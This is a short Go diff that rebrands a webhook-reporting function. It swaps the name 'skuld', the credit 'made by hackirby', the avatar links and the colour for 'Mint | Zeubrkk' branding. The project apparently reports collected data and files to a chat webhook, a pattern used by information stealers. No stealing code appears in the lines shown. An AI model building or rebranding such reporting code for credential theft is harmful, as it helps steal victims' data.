@@ -171,16 +171,17 @@ func Webhook(webhook string, data map[string]interface{}, files ...string) {
 		return
 	}
 
-	data["username"] = "skuld"
-	data["avatar_url"] = "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"
+	data["username"] = "Mint"
+	data["avatar_url"] = "https://media.discordapp.net/attachments/1200079639192801411/1210243873662701598/DALLE-2024-02-19-00.47.png"
 
 	if data["embeds"] != nil {
 		for _, embed := range data["embeds"].([]map[string]interface{}) {
 			embed["footer"] = map[string]interface{}{
-				"text":     "skuld - made by hackirby",
-				"icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+				"text":     "Mint | Zeubrkk",
+				"icon_url": "https://media.discordapp.net/attachments/1200079639192801411/1210243873662701598/DALLE-2024-02-19-00.47.png",
 			}
-			embed["color"] = 0xb143e3
+			embed["color"] = 0x7CFC00
+
 		}
 	}
 
